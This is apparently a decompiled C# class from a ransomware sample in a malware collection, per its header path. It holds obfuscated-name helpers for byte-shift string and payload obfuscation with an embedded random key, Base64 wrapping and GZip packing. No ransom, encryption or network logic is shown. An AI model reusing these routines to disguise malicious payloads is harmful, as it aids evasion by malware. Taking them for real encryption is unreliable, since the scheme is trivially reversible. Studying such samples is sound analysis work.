// Decompiled with JetBrains decompiler
// Type: ẍ߮ᑐᗭ৲ᗒ̛ᗫ།ཏӍᡸẗ᡽़य़ᢠ᛭༌.ᲆࣔ༫ᢢᛞዿ᪳ಸืቦפÃዄ਀ԭឝᠶ
// Assembly: start1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B30574D9-5740-4AF1-9AAD-FBD9FE6B2A96
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-89f3ccf08032a8f789a4d56feebe797fb02d3c983b9f4783b0428640dbafc04e.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C
{
  internal class \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ
  {
    public static byte[] ŃᦗἺٲၢ\u1CFDڜ\u0AFF೮ଣٴ(byte[] _param0, bool _param1)
    {
      try
      {
        int num = new Random().Next(-2000000000, 2000000000);
        for (int index = 0; index < _param0.Length; ++index)
          _param0[index] = (_param0[index] += (byte) num);
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) _param0);
        byte[] bytes = BitConverter.GetBytes(num);
        byteList.InsertRange(byteList.Count / 2, (IEnumerable<byte>) bytes);
        byte[] array = byteList.ToArray();
        byteList.Clear();
        return _param1 ? Encoding.ASCII.GetBytes(Convert.ToBase64String(array)) : array;
      }
      catch
      {
      }
      return (byte[]) null;
    }

    public static byte[] ᮍΐฝᬺދᆙ໔(byte[] _param0, bool _param1)
    {
      try
      {
        List<byte> byteList1 = new List<byte>(_param1 ? (IEnumerable<byte>) Convert.FromBase64String(Encoding.ASCII.GetString(_param0)) : (IEnumerable<byte>) _param0);
        int int32 = BitConverter.ToInt32(byteList1.GetRange((byteList1.Count - 4) / 2, 4).ToArray(), 0);
        byteList1.RemoveRange((byteList1.Count - 4) / 2, 4);
        for (int index1 = 0; index1 < byteList1.Count; ++index1)
        {
          List<byte> byteList2;
          int index2;
          byteList1[index1] = (byteList2 = byteList1)[index2 = index1] = (byte) ((uint) byteList2[index2] - (uint) (byte) int32);
        }
        byte[] array = byteList1.ToArray();
        byteList1.Clear();
        return array;
      }
      catch
      {
      }
      return (byte[]) null;
    }

    public static string \u1CC3̯\u0DF6ᎂ\u0970సటᬱථʎ\u05FAᶧሩ\u08D7ፚ(string _param0, bool _param1)
    {
      try
      {
        int num = new Random().Next(-2000000000, 2000000000);
        byte[] bytes1 = Encoding.GetEncoding(1252).GetBytes(_param0);
        for (int index = 0; index < bytes1.Length; ++index)
          bytes1[index] += (byte) num;
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) bytes1);
        byte[] bytes2 = BitConverter.GetBytes(num);
        byteList.InsertRange(byteList.Count / 2, (IEnumerable<byte>) bytes2);
        byte[] array = byteList.ToArray();
        byteList.Clear();
        return _param1 ? Convert.ToBase64String(array) : Encoding.GetEncoding(1252).GetString(array);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static string ᥣᑉᑡ᠗พ(string _param0, bool _param1)
    {
      try
      {
        List<byte> byteList1 = new List<byte>(_param1 ? (IEnumerable<byte>) Convert.FromBase64String(_param0) : (IEnumerable<byte>) Encoding.GetEncoding(1252).GetBytes(_param0));
        int int32 = BitConverter.ToInt32(byteList1.GetRange((byteList1.Count - 4) / 2, 4).ToArray(), 0);
        byteList1.RemoveRange((byteList1.Count - 4) / 2, 4);
        for (int index1 = 0; index1 < byteList1.Count; ++index1)
        {
          List<byte> byteList2;
          int index2;
          byteList1[index1] = (byteList2 = byteList1)[index2 = index1] = (byte) ((uint) byteList2[index2] - (uint) (byte) int32);
        }
        byte[] array = byteList1.ToArray();
        byteList1.Clear();
        return Encoding.GetEncoding(1252).GetString(array);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static byte[] Ҳฦᯈߔᖟ\u0FF3(byte[] _param0)
    {
      MemoryStream memoryStream = new MemoryStream();
      using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Compress, true))
        gzipStream.Write(_param0, 0, _param0.Length);
      memoryStream.Position = 0L;
      byte[] numArray = new byte[memoryStream.Length];
      memoryStream.Read(numArray, 0, numArray.Length);
      byte[] dst = new byte[numArray.Length + 4];
      Buffer.BlockCopy((Array) numArray, 0, (Array) dst, 4, numArray.Length);
      Buffer.BlockCopy((Array) BitConverter.GetBytes(_param0.Length), 0, (Array) dst, 0, 4);
      return dst;
    }

    public static byte[] ɺ۸Ѩӿᖑᓞ\u089Dƚਙ\u1C81ᷢᨒᰴѐܿ\u0B76ẞ(byte[] _param0)
    {
      using (MemoryStream memoryStream = new MemoryStream())
      {
        int int32 = BitConverter.ToInt32(_param0, 0);
        memoryStream.Write(_param0, 4, _param0.Length - 4);
        byte[] buffer = new byte[int32];
        memoryStream.Position = 0L;
        using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
          gzipStream.Read(buffer, 0, buffer.Length);
        return buffer;
      }
    }
  }
}
